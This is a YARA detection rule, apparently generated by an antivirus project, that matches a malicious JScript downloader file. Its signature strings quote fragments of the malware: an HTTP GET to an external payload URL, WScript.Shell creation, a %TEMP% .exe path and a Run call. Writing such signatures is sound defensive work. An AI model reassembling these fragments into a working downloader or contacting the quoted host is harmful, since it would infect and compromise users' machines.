rule sig_20160401_914a5d9db020781fd7352ca9819d8667 {
  meta:
    description = "datamaliciousorder - file 20160401_914a5d9db020781fd7352ca9819d8667.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "93102d005bd7135c9e42d96589c899ab8e52935bbcaead3da3051cd46e99240e"

  strings:
    $s1  = "NiwXli[WgSww](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "var DtfMi = function EsAo() {return WScript[OazWhk](\"WScript\"+\".Shell\");}(), NaoPav = 11;" fullword ascii
    $s3  = "function WrUl(JqtHrw, TqPr){BkOa = BkOa * 1; return JqtHrw - TqPr;};" fullword ascii
    $s4  = "if (NiwXli[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MqbPy() {return DtfMi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3nGeCFLkAPhah.ex\" + \"e\";};" fullword ascii
    $s6  = "function LprAko(){return IxGx + \"\";};" fullword ascii
    $s7  = "var DdDg = new this[\"Date\"]();" fullword ascii
    $s8  = "ZorWv = true; " fullword ascii
    $s9  = "var ZorWv = false;" fullword ascii
    $s10 = "function KeVh(SnlLsk) {var MswXyn = (1, 2, 3, 4, 5, SnlLsk); return MswXyn;};" fullword ascii
    $s11 = "function BtVi(RkOww){DtfMi[\"R\"+\"un\"](RkOww, BkOa, BkOa);};" fullword ascii
    $s12 = "function TzmTqb()" fullword ascii
    $s13 = "function JhVi(){return OazWhk;};" fullword ascii
    $s14 = "function EvhLq(){return 23;};" fullword ascii
    $s15 = "var BsbWl = false;" fullword ascii
    $s16 = "return WrUl(JqVc, IuNvt);" fullword ascii
    $s17 = "function OkPi() {return ((MzCaz == true) && (MzCaz == ZorWv)) ? 1 : BkOa;};" fullword ascii
    $s18 = "} catch(KdQh){};};" fullword ascii
    $s19 = "var MzCaz = false;" fullword ascii
    $s20 = "}while (IuuJca);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}